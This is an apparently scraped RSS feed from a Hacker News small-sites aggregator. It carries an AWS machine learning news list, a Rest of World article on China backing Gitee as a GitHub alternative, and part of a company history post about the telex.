          <div x-data="{ link: 'https://www.cloudnews.dev/rss/c2a026e3-0f28-49e4-8154-a8c3c0359802/feed.xml' }">
            <h2>AWS Machine Learning Feed</h2>
            <p><span @click="$clipboard(link)">copy link <i></i></span>
          </p></div>
          
          <div>
          <h3><span>News</span></h3>
          <div x-data="{show:false, show_social: false}">

              <div>
                <div>
                  <div>
                    <p>
Amazon Rekognition Custom Labels is now available in the Asia Pacific (Singapore), Asia Pacific (Sydney), Asia Pacific (Seoul), and Asia Pacific (Tokyo) AWS Regions
                      <a href="https://aws.amazon.com/about-aws/whats-new/2021/01/amazon-rekognition-custom-labels-available-additional-regions/" target="_blank"><i></i></a>
                    </p>
                    <p>
2021-01-15
                    </p>
                  </div>
                </div>
                </div>

              <div>
                <div>
                  <div>
                    <p>
Amazon Fraud Detector launches ability to cancel in-progress model trainings
                      <a href="https://aws.amazon.com/about-aws/whats-new/2021/01/amazon-fraud-detector-launches-ability-to-cancel-in-progress-model-trainings/" target="_blank"><i></i></a>
                    </p>
                    <p>
2021-01-14
                    </p>
                  </div>
                </div>
                </div>

            
            <div x-show="show" x-cloak="">

                <div>
                  <div>
                    <div>
                      <p>
AWS DeepComposer launches new learning capsule that dives deep into Transformer models
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/aws-deepcomposer-launches-learning-capsule-dives-deep-transformer-models/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-21
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Amazon Transcribe Medical now supports both streaming and batch transcription of multi-channel audio
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/amazon-transcribe-medical-now-supports-both-streaming-and-batch-transcription-of-multi-channel-audio/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-21
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Now launch Amazon SageMaker Studio Notebooks backed by Spark in Amazon EMR
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/now-launch-amazon-sagemaker-studio-notebooks-backed-spark-amazon-emr/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-21
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Amazon SageMaker Autopilot adds Deep Learning Models
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/amazon-sagemaker-autopilot-adds-deep-learning-models/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-18
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Introducing Amazon SageMaker ml.P4d instances for highest performance ML training in the cloud
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/introducing-amazon-sagemaker-ml-p4d-instances-for-highest-performance-ml-training-in-the-cloud/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-17
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Now Secure Your SageMaker Studio Access Using AWS PrivateLink and AWS IAM SourceIP Restrictions
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/secure-sagemaker-studio-access-using-aws-privatelink-aws-iam-sourceip-restrictions/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-14
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Amazon Kendra adds support for custom synonyms
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/amazon-kendra-adds-support-for-custom-synonyms/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-10
                      </p>
                    </div>
                  </div>
                  </div>

                <div>
                  <div>
                    <div>
                      <p>
Two new libraries for distributed training on Amazon SageMaker
                        <a href="https://aws.amazon.com/about-aws/whats-new/2020/12/introducing-distributed-training-on-amazon-sagemaker/" target="_blank"><i></i></a>
                      </p>
                      <p>
2020-12-09
    …</p></div></div></div></div></div></div></li></ul></div></section></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cloudnews.dev/feeds">https://www.cloudnews.dev/feeds</a></em></p>]]>
            </description>
            <link>https://www.cloudnews.dev/feeds</link>
            <guid isPermaLink="false">hacker-news-small-sites-25836975</guid>
            <pubDate>Tue, 19 Jan 2021 18:44:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[China wants to build an open source ecosystem to rival GitHub]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 186 (<a href="https://news.ycombinator.com/item?id=25836808">thread link</a>) | @donohoe
<br/>
January 19, 2021 | https://restofworld.org/2021/china-gitee-to-rival-github/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/china-gitee-to-rival-github/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p>It was downloading a virtual private network that ultimately convinced Joe that he wanted to be a programmer. On the other side of China’s firewall three years ago, he stumbled across American journalist Steven Levy’s book <em>Hackers: Heroes of the Computer Revolution</em>, which describes hackers not as malicious actors but people who saw the potential of the internet to benefit all — visionaries who understood early on the revolutionary possibility of computers. This idea, that programming could be chaotic and creative, resonated with Joe while he explored the internet beyond the reach of China’s censors.</p>



<p>“I found myself attracted by the idea of open source and hacker culture, and interested in the challenging part of programming,” said Joe, whose name has been changed to protect his identity. He learned to program by joining free web development classes online and looking at existing code on the Microsoft-owned GitHub, the world’s largest open source code repository. Today, he is a software engineer in Shanghai.</p>



<p>Open source code has been <a href="https://interconnected.blog/open-source-in-china-the-game/">essential</a> for the rapid growth of China’s tech sector. At Chinese tech companies, programmers like Joe have at their disposal foundational building blocks of code freely available on GitHub. This allows them to make their own rather than starting from scratch every time, meaning they can iterate and scale fast. With their code hosted in public for all to see, companies benefit from programmers around the world raking it over for errors; programmers learn from each other’s experiments and mistakes in real time. But while open source code has helped bolster China’s tech scene, the idea behind it — borderless exchange of information — contrasts with Beijing’s controlled approach to managing the internet.</p>



<p>Uncertainty hangs over GitHub’s future in China. Many fear that the site could be banned by China’s internet censors for hosting <a href="https://www.wired.com/story/china-github-free-speech-covid-information/">a workers’ protest</a> or <a href="https://qz.com/1846277/china-arrests-users-behind-github-coronavirus-memories-page/">information about the coronavirus</a>. Developers have raised concerns that American regulators could pull the plug over the company’s business with Chinese firms, though <a href="https://www.scmp.com/abacus/culture/article/3029385/github-says-chinese-developers-are-safe-export-restrictions">GitHub has said</a> the open source code itself is exempt from these export controls.</p>



<p>Amid the tensions, Beijing has embraced open source in the development of emerging technologies, especially in areas like artificial intelligence and 5G. The goal is not only to position China on the global cutting edge of high-tech development but for Chinese companies to rely solely on homegrown talent and supply chains. In recent months, the Chinese government has championed domestic alternatives to widely used international open source institutions, particularly Gitee, a <a href="https://blog.gitee.com/2020/08/17/gitee-gxb/">direct parallel to GitHub</a>.&nbsp;</p>



<p>But adopting open source technologies means embracing transparency, standardization, and a borderless philosophy — one that may sit uncomfortably with China’s push for technological self-reliance. “Basically, you cannot nationalize open source,” said Julian Sun, Beijing-based senior research director at tech industry analysis firm Gartner. “It’s already global.”</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/GettyImages-967228266-40x60.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/GettyImages-967228266-600x1066.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/GettyImages-967228266-400x599.jpg 400w, https://restofworld.org/wp-content/uploads/2021/01/GettyImages-967228266-600x899.jpg 600w, https://restofworld.org/wp-content/uploads/2021/01/GettyImages-967228266-1000x1498.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/01/GettyImages-967228266-1600x2396.jpg 1600w, " sizes="(max-width: 640px) 100vw, 300px" alt="GitHub is the largest code repository in the world, with more than 40 million users.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Michael Short/Bloomberg/Getty Images</span>
			</figcaption>
		</figure>


<hr>



<p>Rooted in the pioneering days of the early internet, the open source movement is founded on the concepts of iteration and reciprocal transparency. If one company’s developer wants to build a particular function into its software, they can go to a code repository like GitHub and see how others have solved the same problem. The more eyes there are on the code, the better it is; companies that make their code public benefit from developers combing it over, catching bugs, and submitting suggested fixes. GitHub has grown into the largest code repository in the world, with more than 40 million users and 206 million code repositories. Even the software behind <a href="https://www.wired.com/story/opinon-the-future-of-american-industry-depends-on-open-source-tech/">F-16 fighter jets</a> runs on open source technology.&nbsp;</p>



<p>China is home to the <a href="https://octoverse.github.com/">fastest-growing number</a> of GitHub users outside of the U.S. Through the site, programmers in China don’t just learn new code — they are exposed to what they describe as the “open source way of thinking,” based on a philosophy of free exchange of ideas and information, without government interference or regulation. Despite the discordance of these principles with China’s approach to controlling the internet, code hosted on GitHub has been essential for the country’s tech sector. If it is blocked, developers know they need an alternative.</p>



<p>Developers’ concern the code hosted on GitHub could be a casualty of the escalating tensions with the U.S. was among the reasons for the Chinese government’s move to promote homegrown platforms, said Yik Chan Chin, a computer scientist and associate professor of communications at Beijing Normal University. “The technical community started to reflect on what the strategy is to protect information technology companies in the future. People started to worry. … What will happen to all the open source software and apps stored in that platform?”</p>



<p>In July, one of China’s top tech policymaking bodies, the Ministry of Industry and Information Technology, joined Huawei, Tencent, and a handful of top universities in a high-tech consortium <a href="https://blog.gitee.com/2020/08/17/gitee-gxb/">endorsing Gitee</a> as the official hub for China’s open source community. Shortly after, Huawei, Tencent, Alibaba, Baidu, and other tech companies announced <a href="https://www.openatom.org/#/projectList">the launch</a> of the OpenAtom Foundation, China’s answer to The Linux Foundation, a long-standing pillar of the international open-source community.</p>



<p>The foundation’s flagship project is Huawei’s mobile operating system, HarmonyOS, intended to rival the dominance of Android and Apple’s operating systems, with the code hosted on Gitee.</p>



<p>Huawei has previously relied on Google’s Android operating system, but the Chinese company’s inclusion on the Entity List has meant that Google can no longer support the partnership. Android is not only the most widely used mobile operating system in China, it’s also the basis for China’s varied, inventive, and well-developed <a href="https://www.theverge.com/2018/10/17/17988564/chinese-phone-software-android-iphone-copy-ui">app ecosystem</a>. The odds of success for HarmonyOS hinge on whether Huawei can encourage developers to build apps for the platform.</p>



<p>There are an estimated 780 million smartphone users in China, and Huawei accounts for <a href="https://www.counterpointresearch.com/china-smartphone-share/">more than 40%</a> of the smartphone market in the country. Huawei has said it’s aiming to get HarmonyOS onto <a href="https://www.scmp.com/tech/article/3117573/huawei-aims-deploy-harmony-os-400-million-devices-2021-going-beyond">400 million</a> devices this year, including smartphones, wearables, and TVs. It could create an enormous market for developers to make products for Harmony in China alone. Developers have criticized the company for not yet releasing enough information to determine how truly independent the operating system is.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-13-at-5.31.22-PM-40x20.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-13-at-5.31.22-PM-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-13-at-5.31.22-PM-400x203.png 400w, https://restofworld.org/wp-content/uploads/2021/01/Screen-Shot-2021-01-13-at-5.31.22-PM-600x304.png 600w, https://restofworld.org/wp-content/uploads/2021/01/Screen-Shot-2021-01-13-at-5.31.22-PM-1000x507.png 1000w, https://restofworld.org/wp-content/uploads/2021/01/Screen-Shot-2021-01-13-at-5.31.22-PM-1600x811.png 1600w, https://restofworld.org/wp-content/uploads/2021/01/Screen-Shot-2021-01-13-at-5.31.22-PM-2800x1418.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="A repository maintained by China’s OpenAtom Foundation on Gitee hosts the open source information for Huawei’s Harmony operating system.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder"><a href="https://gitee.com/" target="_blank" rel="noopener noreferrer">https://gitee.com/</a></span>
			</figcaption>
		</figure>


<p>“Gitee’s future depends on attracting quality open source projects onto its platform, from both in and outside of China, which in turn attracts developers from both China and elsewhere to collaborate and contribute,” Kevin Xu, venture investor and founder of newsletter <a href="https://interconnected.blog/">Interconnected</a>, told <em>Rest of World</em>.</p>



<p>“It takes years to build that kind of network effect among developers that GitHub has currently,” said Xu over email. “It’s impossible to know what will be the catalyst for Gitee. Having a central government ministry’s support does not help in either attracting top-tier projects or developers from inside and outside of China; it only helps with getting business from highly regulated or government customers.”</p>



<p>Gitee does have advantages over GitHub, which requires a baseline level of English to use. Many programmers in China either access the U.S. site through mirrors or through Chinese-language blogs, which can be outdated. GitHub’s leadership has expressed interest in opening a dedicated China operation, and authorities have <a href="https://www.ft.com/content/c6993200-1ff3-11ea-b8a1-584213ee7b2b">reportedly encouraged</a> the company to expand, but that has yet to materialize. A more widely used Chinese-language environment could allow more programmers to join in on open source coding.&nbsp;</p>



<p>However, Beijing’s push for a vibrant open source ecosystem based in China could be hamstrung by its own, long-standing objections to the environment that birthed the movement — the free and open exchange of information. The controlled internet behind the Great Firewall is not as rich with information as the unfettered web beyond it.</p>



<p>“There are differences in how people access knowledge in China versus how people access this information outside of China,” said Joe. “Because of the Great Firewall, there are huge quality differences between the knowledge and information you can get from Google and Wikipedia [vs] Baidu.”</p>
			<!-- Article End -->

		</div></div>]]>
            </description>
            <link>https://restofworld.org/2021/china-gitee-to-rival-github/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25836808</guid>
            <pubDate>Tue, 19 Jan 2021 18:30:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Few Words About the Telex (2017)]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25836525">thread link</a>) | @todsacerdoti
<br/>
January 19, 2021 | https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/ | <a href="https://web.archive.org/web/*/https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1755">
	
	
	<div>
		<p>Real time, text communications are not the invention of email. In the 1960’s and 1970’s, long distance was expensive and fax very slow. Vulcan needed an alternate method to communicate in real time for the following reasons:</p>
<ul>
<li>The two offices needed written communications on production schedules and preparation of quotations. For example, the factory was required to send a periodic telex to inform the executive office of the status of every back order in the system.</li>
<li>Since a third of Vulcan’s sales volume was international, it needed to communicate rapidly with its customers, both during the sales process and to respond rapidly during breakdowns.</li>
<li>Its field service force needed a way to obtain quick answers, especially when in places like Southeast Asia where the time difference made voice telephone difficult.</li>
</ul>
<p>Telex was the obvious answer. A more general description of the technology and its history is given below; here we will concentrate on Vulcan’s use of telex as a business tool.</p>
<p><img data-attachment-id="53" data-permalink="https://vulcanhammer.info/32asr/" data-orig-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/32asr.gif" data-orig-size="213,288" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="32asr" data-image-description="" data-medium-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/32asr.gif?w=213" data-large-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/32asr.gif?w=213" src="https://vulcanhammerinfo.files.wordpress.com/2017/06/32asr.gif?w=1040" alt="32asr">During the years the <a href="https://vulcanhammerinfo.wordpress.com/2017/07/09/vulcan-florida-executive-office/">Australian Avenue office</a> was in operation, both that office and the <a href="https://vulcanhammerinfo.wordpress.com/2017/07/09/vulcans-chattanooga-factory/">Chattanooga facility</a> possessed telex machines similar to the one shown on the right. These were basically electromechanical terminals using roll paper printed on by a cylindrical drum with the letters on it (typewriters with a ball printer used the same idea, but the results looked better.) On the left was the paper tape punch. For most telexes, one composed them recording the telex on the paper tape, which encoded the data with a system of punched holes, similar to a player piano roll. When the telex was sent, once the connection was made, the paper tape was played back to the receiving telex. In this way the message would not be hindered by slow typing with mistakes. It was also possible to leave the tape punch on to record receiving telexes as well for retransmission. (<em>A fictional enactment of using the telex–and the possible result–is found in the novel <a href="http://www.lulu.com/content/633941">The Ten Weeks</a>.</em>)&nbsp; A telex machine similar to Vulcan’s is shown in action below.</p>

<p><span><iframe width="1040" height="585" src="https://www.youtube.com/embed/KqTzvpYumQs?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
<p>Telex could also be used in a “dialogue” mode similar to instant messaging or IRC chat, but Vulcan seldom used it in this way. With this, the initiator of the dialogue could ring the bell at the recipient’s end to get their attention.</p>
<figure data-shortcode="caption" id="attachment_1793" aria-describedby="caption-attachment-1793"><img data-attachment-id="1793" data-permalink="https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/telex-straits-engineers-2/" data-orig-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg" data-orig-size="2109,1827" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="telex straits engineers" data-image-description="" data-medium-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=300" data-large-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=1024" src="https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=1040" alt="telex straits engineers" srcset="https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=1040 1040w, https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=2080 2080w, https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=150 150w, https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=300 300w, https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=768 768w, https://vulcanhammerinfo.files.wordpress.com/2017/07/telex-straits-engineers.jpg?w=1024 1024w" sizes="(max-width: 1040px) 100vw, 1040px"><figcaption id="caption-attachment-1793">To illustrate what a telex actually looked like, this is a 1982 telex to Vulcan’s Florida based manager of engineering services, Jesse Perry, from Alan Keet at Straits Engineers in Singapore.</figcaption></figure>
<figure data-shortcode="caption" id="attachment_859" aria-describedby="caption-attachment-859"><img data-attachment-id="859" data-permalink="https://vulcanhammer.info/western-union-invoice-dec-7/" data-orig-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/western-union-invoice-dec-7.jpg" data-orig-size="375,535" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Western-Union-Invoice-Dec-7" data-image-description="" data-medium-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/western-union-invoice-dec-7.jpg?w=210" data-large-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/western-union-invoice-dec-7.jpg?w=375" src="https://vulcanhammerinfo.files.wordpress.com/2017/06/western-union-invoice-dec-7.jpg?w=1040" alt="Western-Union-Invoice-Dec-7" srcset="https://vulcanhammerinfo.files.wordpress.com/2017/06/western-union-invoice-dec-7.jpg 375w, https://vulcanhammerinfo.files.wordpress.com/2017/06/western-union-invoice-dec-7.jpg?w=105 105w, https://vulcanhammerinfo.files.wordpress.com/2017/06/western-union-invoice-dec-7.jpg?w=210 210w" sizes="(max-width: 375px) 100vw, 375px"><figcaption id="caption-attachment-859">A telex bill for Vulcan’s West Palm Beach office for December 1970. All of the telexes here went to Belgium, so they were probably for the Vulcan’s business associate in Vilvorde, Nilens. Since they were around Christmastime, somebody hopefully put in a “Joyeux Noel” somewhere in there.</figcaption></figure>
<p>Telexes were identified by the telex number and the answerback. In the example above, when Straits Engineers sent the “Who are you?” our machine responded with its answerback, VULCAN WPB. The sending machine then replied with its own before going into the message, generally adding its telex number as well. Thus, “STREL RS” was the sender’s answerback and “23644” was the telex number. (The “RS” identified the telex as from Singapore; this is the <a title="direct ancestor to the national internet domain identifier" href="https://vulcanhammerinfo.files.wordpress.com/2017/07/rfc1394.pdf">direct ancestor to the national internet domain identifier</a>. The answerback is the key feature; it verifies to the sender that the recipient is actually receiving what’s sent. Once the recipient’s number is dialled, the cross (<a href="https://www.vulcanhammer.org/what-is-the-gospel/">the usual sign of getting access</a>) appeared with the “who are you?” request. If connected, the recipient’s answerback came up. This enabled telexes to have legal standing.</p>
<p>A little figuring for inflation with the bill shown, however, will show that the messages, generally not very long, were rather expensive. This led to a lot of people using abbreviations in telexes (such as “u” for “you”, very similar to what you see in text messaging today.) Vulcan’s people never quite got the hang of this. Still, telexes were received in real time, or at least greeted their recipients when they arrived the next morning, which is more than “snail mail” could do then or now.</p>
<p>Telex machines were virtually universal with Vulcan’s international business associates. One Vulcan agent boasted of his own status by informing us that he had his own machine, while some of his competitors used “the public telex!”</p>
<p>One of the more intensive uses of telex took place in 1981 with the <a href="https://vulcanhammerinfo.wordpress.com/2017/06/30/a-fistful-of-yuan-vulcan-in-china-1981-3/">negotiations and sale of the 560 package to the Petroleum Corporation of the People’s Republic of China</a>. The Chinese were as detailed in their demands of quotation presentation as they were in those for technical information. After a day of negotiations, we composed and sent a telex with our requests back to the U.S., where the day was just started. The next morning we would have our reply and resumed our negotiations. (Telephone calls in and out of China at that time were very difficult, and with a long list of spare parts and prices, would not have done the job.)</p>
<p>After that Vulcan replaced its telex machine (the Florida office was closed) with a newer model, with a dot matrix printer (still on a roll) and a screen terminal for composition.</p>
<figure data-shortcode="caption" id="attachment_5155" aria-describedby="caption-attachment-5155"><img data-attachment-id="5155" data-permalink="https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/jhp-ken-walsh-24-feb-1983/" data-orig-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg" data-orig-size="2469,2394" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="jhp-ken-walsh-24-feb-1983" data-image-description="" data-medium-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=300" data-large-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=1024" src="https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=1040" alt="jhp-ken-walsh-24-feb-1983" srcset="https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=1040 1040w, https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=2080 2080w, https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=150 150w, https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=300 300w, https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=768 768w, https://vulcanhammerinfo.files.wordpress.com/2017/07/jhp-ken-walsh-24-feb-1983.jpg?w=1024 1024w" sizes="(max-width: 1040px) 100vw, 1040px"><figcaption id="caption-attachment-5155">Telex in colour: a telex from Vulcan’s field service manager, Jesse Perry, to Ken Walsh at Brunei Shell, 1983. The outgoing portion is in red; the incoming portion is in black. You can easily see the answerback and other information coming from the remote party. This was sent from the Hyatt in Singapore; their telex was even then more advanced than Vulcan’s once and future machine.</figcaption></figure>
<figure data-shortcode="caption" id="attachment_5156" aria-describedby="caption-attachment-5156"><img data-attachment-id="5156" data-permalink="https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/ken-walsh-jhp-25-feb-1983/" data-orig-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg" data-orig-size="2452,2430" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ken-walsh-jhp-25-feb-1983" data-image-description="" data-medium-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=300" data-large-file="https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=1024" src="https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=1040" alt="ken-walsh-jhp-25-feb-1983" srcset="https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=1040 1040w, https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=2080 2080w, https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=150 150w, https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=300 300w, https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=768 768w, https://vulcanhammerinfo.files.wordpress.com/2017/07/ken-walsh-jhp-25-feb-1983.jpg?w=1024 1024w" sizes="(max-width: 1040px) 100vw, 1040px"><figcaption id="caption-attachment-5156">Brunei Shell’s Ken Walsh’s reply to Jesse Perry. You can see the colour reversal from the previous telex; now it’s mostly black (incoming.) The red answerbacks went to Brunei Shell’s machine in Kuala Belait.</figcaption></figure>
<p>Below: telex using Vulcan’s dot matrix machine, attempting to expedite payment of a <a href="https://vulcanhammerinfo.wordpress.com/2017/06/30/a-fistful-of-yuan-anatomy-of-a-letter-of-credit/">letter of credit</a> in 1988.</p>
<figure data-shortcode="caption" id="attachment_1415" aria-describedby="caption-attachment-1415"><img data-attachment-id="1415" data-permalink="https://vulcanhammer.info/bohai-1988-parts-order-61/" data-orig-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/bohai-1988-parts-order-61.jpg" data-orig-size="750,1018" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Bohai-1988-Parts-Order-61" data-image-description="" data-medium-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/bohai-1988-parts-order-61.jpg?w=221" data-large-file="https://vulcanhammerinfo.files.wordpress.com/2017/06/bohai-1988-parts-order-61.jpg?w=750" src="https://vulcanhammerinfo.files.wordpress.com/2017/06/bohai-1988-parts-order-61.jpg?w=1040" alt="Bohai-1988-Parts-Order-61" srcset="https://vulcanhammerinfo.files.wordpress.com/2017/06/bohai-1988-parts-order-61.jpg 750w, https://vulcanhammerinfo.files.wordpress.com/2017/06/bohai-1988-parts-order-61.jpg?w=111 111w, https://vulcanhammerinfo.files.wordpress.com/2017/06/bohai-1988-parts-order-61.jpg?w=221 221w" sizes="(max-width: 750px) 100vw, 750px"><figcaption id="caption-attachment-1415">A telex using Vulcan’s dot matrix machine, attempting to expedite payment of a letter of credit in 1988.</figcaption></figure>
<p>Nevertheless throughout the 1980’s Vulcan’s use of the telex was in decline for two reasons:</p>
<ol>
<li>The collapse of the oil industry in the early 1980’s shrunk Vulcan’s international business considerably.</li>
